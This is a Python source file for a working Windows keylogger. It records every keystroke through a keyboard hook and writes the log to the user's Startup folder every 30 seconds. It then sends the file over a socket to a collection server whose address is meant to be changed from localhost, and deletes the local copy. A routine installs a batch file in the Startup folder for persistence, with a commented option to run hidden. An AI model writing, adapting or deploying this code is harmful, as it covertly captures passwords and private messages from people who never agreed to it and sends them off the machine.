import shutil

import keyboard
import smtplib
from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import socket
import os

SEND_REPORT_EVERY = 30
class Keylogger:
    def __init__(self, interval, report_method="file"):
        self.interval = interval
        self.interval = interval
        self.report_method = report_method
        self.log = ""
        self.start_time = datetime.now()
        self.end_time = datetime.now()
        self.seperator = "<SEPARATOR>"
        self.buffer_size = 4096
        #self.host = "10.159.13.240" CHANGE
        self.host = "127.0.0.1"
        self.port = 5001

    def start(self):
        self.start_time = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        print(f"{datetime.now()} - Started keylogger")
        keyboard.wait()

    def callback(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        if name == "[BACKSPACE]":
            self.log = self.log[:-1]
        else:
            self.log += name

    def update_filename(self):
        start_dt_str = str(self.start_time)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_time)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        # open the file in write mode (create it)
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        print(startup_folder)
        startup_folder = startup_folder + "\\" + self.filename + ".txt"
        print(startup_folder)
        with open(startup_folder, "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
        self.send_server()
        os.remove(startup_folder)

    def report(self):
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            #if self.report_method == "email":
            #    self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            if self.report_method == "file":
                # self.send_server()
                self.report_to_file()
            # if you don't want to print in the console, comment below line
            print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def send_server(self):
        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        startup_folder = startup_folder + "\\" + self.filename + ".txt"

        self.filename = self.filename + ".txt"
        filesize = os.path.getsize(startup_folder)
        s = socket.socket()
        print(f"[+] Connecting to {self.host}:{self.port}")
        s.connect((self.host, self.port))
        print("[+] Connected.")
        s.send(f"{self.filename}{self.seperator}{filesize}".encode())
        with open(startup_folder, "rb") as f:
            while True:
                bytes_read = f.read(self.buffer_size)
                if not bytes_read:
                    break
                s.sendall(bytes_read)
                print(bytes_read)
            s.close()
            print("Sent.")


def add_to_startup():
    # Finds startup path
    startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Finds the script
    script_path = find_script()
    print(script_path)

    # Check if the script exists
    if not os.path.exists(script_path):
        print(f"Error: Script not found at {script_path}")
        return

    # Destination path for the shortcut
    shortcut_path = os.path.join(startup_folder, os.path.basename(script_path)[:-3] + '.lnk')

    try:
        # Create a shortcut in the Startup folder
        create_bash(startup_folder, script_path)
        print(f"Successfully added '{os.path.basename(script_path)}' to '{startup_folder}'.")
    except Exception as e:
        print(f"Error: {e}")

def find_script():
    # Define the filename of your script
    script_filename = 'keylogger-server.py'

    # Define the directories to search for the script
    search_directories = [
        os.path.expanduser('~'),  # Search in user's home directory
        'C:\\',                   # Search in the root directory of the C drive
        # Add more directories if necessary
    ]

    # Loop through the search directories and find the script
    for directory in search_directories:
        for root, dirs, files in os.walk(directory):
            if script_filename in files:
                return os.path.join(root, script_filename)

    return None

def create_bash(startup_path, script_path):
    startup_path += "\\" + "keylogger_bat.bat"
    if (os.path.exists(startup_path) == False):
        with open(startup_path, 'w') as f:
            # Use to run more discretely without content printed to the screen
            #f.write(f'@echo off\npythonw "{script_path}"\n')

            # prints content so you can see what is happening
            f.write(f'python "{script_path}"\n')
        print("Bash made at " + startup_path)
    return None

if __name__ == "__main__":
    
    # This function adds the script to the startup folder on windows so that it will run when the computer is restarted
    #add_to_startup()
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()
